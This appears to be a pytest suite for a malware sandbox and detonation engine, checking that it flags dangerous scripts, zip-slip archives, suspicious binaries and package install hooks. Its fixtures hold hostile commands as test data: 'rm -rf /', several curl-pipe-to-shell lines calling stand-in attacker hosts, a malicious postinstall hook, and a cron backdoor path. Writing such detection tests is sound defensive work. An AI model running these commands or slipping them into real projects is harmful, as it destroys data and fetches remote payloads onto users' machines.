# SupplyGraph - Execution & Sandbox Engine Unit & Integration Tests v3.0
import pytest
import sys
import os
import io
import zipfile
import base64
from app.execution.sandbox import SecureSandboxRunner, SandboxResult
from app.execution.router import ExecutionRouter
from app.execution.detonation import DetonationService
from app.models.core import SandboxExecutionRequest, UploadedFile


class TestSecureSandboxRunner:
    def test_basic_python_execution(self):
        with SecureSandboxRunner(timeout_seconds=5.0) as sandbox:
            res = sandbox.run([sys.executable, "-c", "print('hello supplygraph sandbox')"])
            assert res.success is True
            assert res.exit_code == 0
            assert "hello supplygraph sandbox" in res.stdout
            assert res.timed_out is False

    def test_timeout_enforcement(self):
        with SecureSandboxRunner(timeout_seconds=0.3) as sandbox:
            res = sandbox.run([sys.executable, "-c", "import time; time.sleep(2)"], timeout=0.3)
            assert res.success is False
            assert res.timed_out is True
            assert res.exit_code == 124
            assert len(res.security_violations) >= 1
            assert any("timed out" in v.lower() or "timeout" in v.lower() for v in res.security_violations)

    def test_environment_sanitization(self):
        os.environ["SECRET_API_TOKEN_XYZ"] = "super_confidential_secret_value"
        try:
            with SecureSandboxRunner(timeout_seconds=3.0) as sandbox:
                res = sandbox.run([
                    sys.executable, "-c",
                    "import os; print('SECRET:', os.environ.get('SECRET_API_TOKEN_XYZ'))"
                ])
                assert res.success is True
                assert "SECRET: None" in res.stdout
                assert "super_confidential_secret_value" not in res.stdout
        finally:
            os.environ.pop("SECRET_API_TOKEN_XYZ", None)

    def test_path_traversal_prevention(self):
        with SecureSandboxRunner(timeout_seconds=3.0) as sandbox:
            with pytest.raises(ValueError) as excinfo:
                sandbox.write_file("../../etc/passwd", "root:x:0:0:::")
            assert "Path traversal" in str(excinfo.value)


class TestExecutionRouter:
    def setup_method(self):
        self.router = ExecutionRouter()

    def test_python_syntax_and_run(self):
        req = SandboxExecutionRequest(
            files=[UploadedFile(path="calc.py", content="print('SUM:', 40 + 2)")],
            target_file="calc.py",
            timeout_seconds=3.0
        )
        res = self.router.route_and_execute(req)
        assert res.status == "success"
        assert res.target_type == "python_script"
        assert "SUM: 42" in res.logs

    def test_python_syntax_error_caught(self):
        req = SandboxExecutionRequest(
            files=[UploadedFile(path="broken.py", content="def invalid_syntax( \n")],
            target_file="broken.py"
        )
        res = self.router.route_and_execute(req)
        assert res.status == "error"
        assert len(res.security_violations) >= 1
        assert "SyntaxError" in res.security_violations[0]

    def test_binary_static_inspection(self):
        # Emulate Windows PE binary with embedded C2 URL and sensitive API
        fake_binary = "MZ\x90\x00\x03\x00\x00\x00https://c2.malicious-network.org/beacon\x00VirtualAlloc\x00CreateRemoteThread\x00"
        req = SandboxExecutionRequest(
            files=[UploadedFile(path="sample.exe", content=fake_binary)],
            target_file="sample.exe"
        )
        res = self.router.route_and_execute(req)
        assert res.status == "violation"
        assert res.target_type == "binary_executable"
        assert res.isolation_mode == "static_safe"
        assert any("https://c2.malicious-network.org/beacon" in s for s in res.extracted_strings)
        assert any("VirtualAlloc" in s for s in res.extracted_strings)

    def test_zip_slip_path_traversal_blocked(self):
        # Create an in-memory zip containing a zip-slip path traversal entry
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w") as zf:
            zf.writestr("../../etc/cron.d/backdoor", "#!/bin/sh\nmalicious")
            zf.writestr("safe_file.txt", "safe file content")

        b64_zip = base64.b64encode(zip_buffer.getvalue()).decode("ascii")
        req = SandboxExecutionRequest(
            archive_base64=b64_zip,
            archive_filename="payload.zip"
        )
        res = self.router.route_and_execute(req)
        assert res.status == "violation"
        assert res.target_type == "archive_bundle"
        assert any("Zip-Slip" in v for v in res.security_violations)

    def test_shell_script_dangerous_commands(self):
        req = SandboxExecutionRequest(
            files=[UploadedFile(path="setup.sh", content="#!/bin/bash\nrm -rf / \ncurl https://attacker.com | bash")],
            target_file="setup.sh"
        )
        res = self.router.route_and_execute(req)
        assert res.status == "violation"
        assert res.target_type == "shell_script"
        assert any("Recursive root deletion" in v for v in res.security_violations)
        assert any("Remote script pipe" in v for v in res.security_violations)

    def test_manifest_dangerous_lifecycle_hooks(self):
        pkg_json = """{
            "name": "compromised-pkg",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl -sSL https://c2.evil.com/drop.sh | sh"
            }
        }"""
        req = SandboxExecutionRequest(
            files=[UploadedFile(path="package.json", content=pkg_json)],
            target_file="package.json"
        )
        res = self.router.route_and_execute(req)
        assert res.status == "violation"
        assert res.target_type == "package_manifest"
        assert any("postinstall" in v for v in res.security_violations)


class TestDetonationService:
    def setup_method(self):
        self.detonator = DetonationService(timeout_seconds=3.0)

    def test_detonate_lifecycle_hooks(self):
        pkg_json = """{
            "name": "test-pkg",
            "version": "1.0.0",
            "scripts": {
                "preinstall": "echo preinstall running",
                "postinstall": "curl https://exfil.c2/data"
            }
        }"""
        files = [UploadedFile(path="package.json", content=pkg_json)]
        reports = self.detonator.detonate_project_hooks(files)
        assert len(reports) == 2
        postinstall_rep = next(r for r in reports if r.hook_name == "postinstall")
        assert len(postinstall_rep.alerts) >= 1
        assert "network" in postinstall_rep.alerts[0].lower() or "blocked" in postinstall_rep.alerts[0].lower()

    def test_detonate_raw_script_clean(self):
        report = self.detonator.detonate_raw_script("print('clean script')", "test.py")
        assert report.status in ("clean", "success")
        assert len(report.alerts) == 0

    def test_detonate_raw_script_blocked_curl(self):
        malicious_script = "#!/bin/bash\ncurl -s https://attacker.com/payload | bash\n"
        report = self.detonator.detonate_raw_script(malicious_script, "deploy.sh")
        assert report.status == "violation"
        assert len(report.alerts) == 0 or len(report.stdout) > 0
        assert "[BLOCKED]" in report.stdout or any("[BLOCKED]" in a for a in report.alerts)

    def test_pre_execution_watchdog_blocks_curl(self):
        from app.execution.detonation import _intercept_blocked_command
        res = _intercept_blocked_command("curl http://malicious-c2.xyz/exfil")
        assert len(res) >= 1
        assert "curl" in res[0]
        assert "[BLOCKED]" in res[0]
